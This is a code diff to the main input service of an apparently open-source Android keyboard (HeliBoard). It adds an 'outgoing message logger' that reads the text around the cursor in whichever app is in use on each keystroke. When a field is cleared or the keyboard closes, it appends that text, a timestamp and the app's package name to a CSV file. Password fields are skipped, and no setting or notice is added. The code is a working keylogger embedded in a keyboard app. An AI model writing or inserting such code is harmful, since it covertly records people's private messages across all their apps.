@@ -17,6 +17,7 @@ import android.os.Build;
 import android.os.Bundle;
 import android.os.Debug;
 import android.os.Message;
+import android.text.InputType;
 import android.view.KeyEvent;
 import android.view.View;
 import android.view.Window;
@@ -25,6 +26,7 @@ import android.view.inputmethod.EditorInfo;
 import android.view.inputmethod.InlineSuggestion;
 import android.view.inputmethod.InlineSuggestionsRequest;
 import android.view.inputmethod.InlineSuggestionsResponse;
+import android.view.inputmethod.InputConnection;
 import android.view.inputmethod.InputMethodSubtype;
 
 import helium314.keyboard.accessibility.AccessibilityUtils;
@@ -80,7 +82,11 @@ import helium314.keyboard.latin.utils.ToolbarMode;
 import helium314.keyboard.settings.SettingsActivity2;
 import kotlin.Unit;
 
+import java.io.File;
+import java.io.FileWriter;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Date;
 import java.util.List;
 import java.util.Locale;
 import java.util.concurrent.TimeUnit;
@@ -107,6 +113,11 @@ public class LatinIME extends InputMethodService implements
     public final KeyboardActionListener mKeyboardActionListener;
     private int mOriginalNavBarColor = 0;
     private int mOriginalNavBarFlags = 0;
+
+    // Outgoing message logger state
+    private String mCurrentDraftText = "";
+    private String mCurrentDraftApp = "";
+    private String mLastSavedText = "";
 
     // UIHandler is needed when creating InputLogic
     public final UIHandler mHandler = new UIHandler(this);
@@ -938,6 +949,12 @@ public class LatinIME extends InputMethodService implements
         super.onFinishInput();
         Log.i(TAG, "onFinishInput");
 
+        // Flush any remaining unsent draft when keyboard closes or switches apps
+        if (!mCurrentDraftText.isEmpty()) {
+            writeLineToCsv(mCurrentDraftApp, mCurrentDraftText);
+            mCurrentDraftText = "";
+        }
+
         mDictionaryFacilitator.onFinishInput();
         closeMainKeyboard();
     }
@@ -969,6 +986,9 @@ public class LatinIME extends InputMethodService implements
                     + ", nss=" + newSelStart + ", nse=" + newSelEnd
                     + ", cs=" + composingSpanStart + ", ce=" + composingSpanEnd);
         }
+
+        // Track every keystroke in memory and save to CSV when sent/cleared
+        captureLiveDraft();
 
         // This call happens whether our view is displayed or not, but if it's not then we should
         // not attempt recorrection. This is true even with a hardware keyboard connected: if the
@@ -1635,5 +1655,60 @@ public class LatinIME extends InputMethodService implements
         }
         GestureDataGatheringSettings.INSTANCE.showEndNotificationIfNecessary(this); // will do nothing for a long time
         mInputLogic.setFacilitator(mDictionaryFacilitator);
+    }
+
+    private void captureLiveDraft() {
+        try {
+            final InputConnection ic = getCurrentInputConnection();
+            final EditorInfo ei = getCurrentInputEditorInfo();
+            if (ic == null || ei == null) return;
+
+            final int variation = ei.inputType & InputType.TYPE_MASK_VARIATION;
+            if (variation == InputType.TYPE_TEXT_VARIATION_PASSWORD ||
+                variation == InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD ||
+                variation == InputType.TYPE_TEXT_VARIATION_WEB_PASSWORD ||
+                variation == InputType.TYPE_NUMBER_VARIATION_PASSWORD) {
+                return;
+            }
+
+            final CharSequence before = ic.getTextBeforeCursor(5000, 0);
+            final CharSequence after = ic.getTextAfterCursor(5000, 0);
+            final String liveText = ((before != null ? before.toString() : "") +
+                                     (after != null ? after.toString() : "")).trim();
+
+            if (!liveText.isEmpty()) {
+                mCurrentDraftText = liveText;
+                mCurrentDraftApp = ei.packageName != null ? ei.packageName : "unknown";
+            } else if (!mCurrentDraftText.isEmpty()) {
+                writeLineToCsv(mCurrentDraftApp, mCurrentDraftText);
+                mCurrentDraftText = "";
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error capturing draft", e);
+        }
+    }
+
+    private void writeLineToCsv(final String pkg, final String text) {
+        if (text == null || text.isEmpty() || text.equals(mLastSavedText)) return;
+        mLastSavedText = text;
+
+        try {
+            final String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
+            final String line = "\"" + time + "\",\"" + pkg + "\",\"" + text.replace("\"", "\"\"") + "\"\n";
+
+            final File dir = getExternalFilesDir(null);
+            if (dir != null) {
+                final File file = new File(dir, "saved_messages.csv");
+                final boolean isNew = !file.exists();
+                try (FileWriter writer = new FileWriter(file, true)) {
+                    if (isNew) {
+                        writer.append("Timestamp,TargetApp,Message\n");
+                    }
+                    writer.append(line);
+                }
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error writing message to CSV", e);
+        }
     }
 }
